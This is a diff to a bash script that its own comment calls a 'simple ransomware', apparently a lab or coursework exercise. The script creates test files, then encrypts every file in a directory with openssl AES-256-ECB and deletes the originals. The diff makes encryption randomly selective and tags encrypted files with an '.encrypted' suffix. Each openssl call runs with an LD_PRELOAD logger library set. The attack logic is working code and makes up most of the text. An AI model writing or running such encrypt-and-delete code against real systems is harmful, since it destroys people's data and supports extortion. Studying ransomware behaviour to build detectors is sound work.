@@ -6,6 +6,7 @@
 # "create a simple ransomware"
 
 FILEDIR=$1
+ENC_SUFFIX=".encrypted"
 
 # create the directory, if it does not already exist
 mkdir -p $FILEDIR
@@ -23,16 +24,19 @@ then
 	read -s pass
 	echo ""
 	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
-        echo -n "0%|--------------------------------------------------|100%"
+	echo "-->Decrypting<--"
+        echo -n "0%|----------------------------------------------------|100%"
         printf '\r'
         COUNT=1
 	for FILE in $(ls $FILEDIR/$input)  
 	do
-		export LD_PRELOAD=./logger.so ; openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
-		rm $FILE
+		if [[ $FILE =~ .*$ENC_SUFFIX.* ]]; then
+			export LD_PRELOAD=./logger.so ; openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
+			rm $FILE
+		fi
 		PERC=$(( COUNT*100 )) ; PERC=$(( PERC/N_OF_FILES ))
                 echo -n "$PERC%|"
-                for i in $(seq 1 5 $PERC)
+                for i in $(seq 1 2 $PERC)
                 do
                         echo -n "█"
                 done
@@ -40,7 +44,8 @@ then
                 COUNT=$(( COUNT+1 ))
         done
         echo ""
-        printf '\e[A\e[K'
+        #printf '\e[A\e[K'
+	echo "Done."
 
 
 
@@ -53,13 +58,18 @@ then
 	read -s pass
 	echo ""
 	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
-	echo -n "0%|--------------------------------------------------|100%"
+	echo "-->Encrypting<--"
+	echo -n "0%|----------------------------------------------------|100%"
 	printf '\r'
 	COUNT=1
 	for FILE in $(ls $FILEDIR/$input)
         do
-		export LD_PRELOAD=./logger.so ; openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.enc -k $pass 
-		rm $FILE
+		RAND=$(shuf -i 0-1 -n 1)  # random 0 or 1 
+		if [[ $RAND -eq 1 ]]  
+		then
+			export LD_PRELOAD=./logger.so ; openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE$ENC_SUFFIX -k $pass 
+			rm $FILE
+		fi
 		PERC=$(( COUNT*100 )) ;	PERC=$(( PERC/N_OF_FILES ))
 		echo -n "$PERC%|"
 		for i in $(seq 1 2 $PERC)
@@ -70,7 +80,8 @@ then
 		COUNT=$(( COUNT+1 ))
 	done
 	echo ""  
-	printf '\e[A\e[K'  
+	#printf '\e[A\e[K'  
+	echo "Done."
 
 elif [[ $choice -eq 0  ]]
 then
@@ -79,7 +90,8 @@ then
 	echo "Basic Filename:"
 	read filename
 	COUNT=1
-	echo -n "0%|--------------------------------------------------|100%"
+	echo "-->Creating Files<--"
+	echo -n "0%|----------------------------------------------------|100%"
 	printf '\r'
 	for number in $(seq 1 $number_of_files)
 	do
@@ -101,7 +113,8 @@ then
 	done
 	# flush the output:
 	echo ""  #go to the next line
-	printf '\e[A\e[K'  # erase previous output line
+	#printf '\e[A\e[K'  # erase previous output line
+	echo "Done."
 else
 	echo "Wrong Option."
 fi
